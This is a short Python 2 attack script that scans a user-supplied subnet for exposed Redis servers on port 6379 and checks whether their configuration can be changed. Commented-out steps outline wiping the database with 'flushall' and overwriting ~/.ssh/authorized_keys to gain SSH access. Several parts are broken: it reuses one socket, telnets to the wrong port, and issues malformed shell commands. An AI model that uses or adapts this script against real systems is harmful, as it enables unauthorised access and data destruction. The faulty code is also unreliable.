import socket
import telnetlib
from netaddr import IPNetwork
#import os, time

subnet = raw_input("Please enter target subnet: ")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

for ip in IPNetwork(subnet).iter_hosts():
	result = sock.connect_ex((str(ip),6379))
	if result == 0:
   		print "Port is open on %s" % str(ip)
   		print ""
   		print "Connecting to Redis: "
   		tn = telnetlib.Telnet(ip)
   		tn.write("CONFIG GET *"+"\n")
   		output = tn.read_all()
   		if "dbfilename" in output:
   			print "Looks like you can manipulate the CONFIG.."
   			#os.system("redis-cli -h" + str(ip) + "flushall")
   			#time.sleep(2)
   			#os.system("foo.txt | redis-cli -h" + str(ip) + "-x set crackit")
   			#time.sleep(2)
   			#os.system("redis-cli -h" + str(ip))
   			#time.sleep(2)
			#os.system("config set dir ~/.ssh/")
			#time.sleep(2)
			#os.system('config set dbfilename "authorized_keys"')
			#time.sleep(2)
			#os.system("save")
			print "Try and SSH to target...."
   		else:
   			print "Not sure this redis is vulnerable.."
	else:
   		print "Port is not open %s" % str(ip)










